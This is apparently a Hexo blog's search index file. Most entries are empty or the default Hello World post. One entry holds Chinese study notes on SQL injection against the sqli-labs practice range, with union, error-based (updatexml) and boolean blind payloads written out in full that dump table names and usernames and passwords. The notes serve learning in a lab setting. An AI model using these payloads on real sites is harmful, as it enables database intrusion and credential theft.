<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>titlle</title>
    <link href="/2023/02/13/uoload%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/02/13/uoload%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>page</title>
    <link href="/2022/12/25/ctf%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/"/>
    <url>/2022/12/25/ctf%E5%88%B7%E9%A2%98%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>sql</title>
    <link href="/2022/11/22/sql%E9%9D%B6%E5%9C%BA%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%89/"/>
    <url>/2022/11/22/sql%E9%9D%B6%E5%9C%BA%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0%EF%BC%88%E5%9F%BA%E7%A1%80%E7%9A%84%E6%B3%A8%E5%85%A5%E5%A7%BF%E5%8A%BF%EF%BC%89/</url>
    
    <content type="html"><![CDATA[<p>一、联合注入（页面有信息回显时）</p><pre><code class="hljs">首先判断注入类型（在id后加上 &#39;或 &quot; ），通过页面报错判断闭合然后通过 ?id=1&#39; order by 3--+ 猜测列数（如果“+”被过滤，可以使用“#，%23”代替“--+”）接着通过 ?id=-1&#39;union select 1,2,3 --+ 得到会回显信息的字段。（sqli-labs是2和3回显）?id=-1&#39;union select 1,database(),3 --+ 得到当前数据库名?id=-1&#39;union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema=&#39;数据库名&#39;--+（查询当前数据库中所有表的名字）?id=-1&#39;union select 1,database(),group_concat(column_name) from information_schema.columns where table_schema=&#39;数据库&#39; and table_name=&#39;表名&#39; --+?id=-1&#39;union select 1,group_concat(username),group_concat(password) from users --+(爆出字段信息)注：初学建议通过分析原码来学习理解注入语句（学习文章 https://blog.csdn.net/elephantxiang/article/details/120091507）</code></pre><p>二、报错注入（）<br>    判断闭合后，直接通过 and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+ 爆出数据库   </p><pre><code class="hljs">  and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31),0x7e),1) --+(爆出表名)and updatexml(1,concat(0x7e,substr((select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; and table_schema=database()),1,31),0x7e),1) --+（爆出字段名）and updatexml(1,concat(0x7e,substr((select group_concat(concat(username,&#39;^&#39;,password)) from users),1,31),0x7e),1) --+（得到信息）注：应学习updatexml（）函数与extractvalue（）函数，截取函数substr（），substr最多能截取32位。</code></pre><p>三、bool盲注</p><pre><code class="hljs">先判断闭合，当页面不会显示信息，但对错页面回显不同时，可以使用bool盲注首先猜测数据库的长度 id=1’ and length(database())=8 --+ascii(substr(database(),1,1))=”ASCII“ --+（通过ASCII码值确定数据库名）and (select count(table_name) from information_schema.tables where table_schema=database())=1 --+（爆表的数量）and left((select table_name from information_schema.tables where table_schema=database() limit x,1),y)=&quot;&quot;--+（变换 x 和 y 的值我们可以得到所有的表名。）?id=1&#39; and left((select column_name from information_schema.columns where table_schema=database() and table_name=&quot;表名&quot; limit x,1),y)=&quot;&quot;--+（爆字段名）?id=1&#39; and left((select ‘字段’ from ‘表名’ limit x,1),y)=&quot;&quot;--+（得到数据）注：通过python脚本可以辅助盲注</code></pre><p>四、延时注入</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>学习笔记 一</title>
    <link href="/2022/09/20/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89-%E4%B8%80/"/>
    <url>/2022/09/20/PHP%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%881%EF%BC%89-%E4%B8%80/</url>
    
    <content type="html"><![CDATA[]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2022/09/19/hello-world/"/>
    <url>/2022/09/19/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
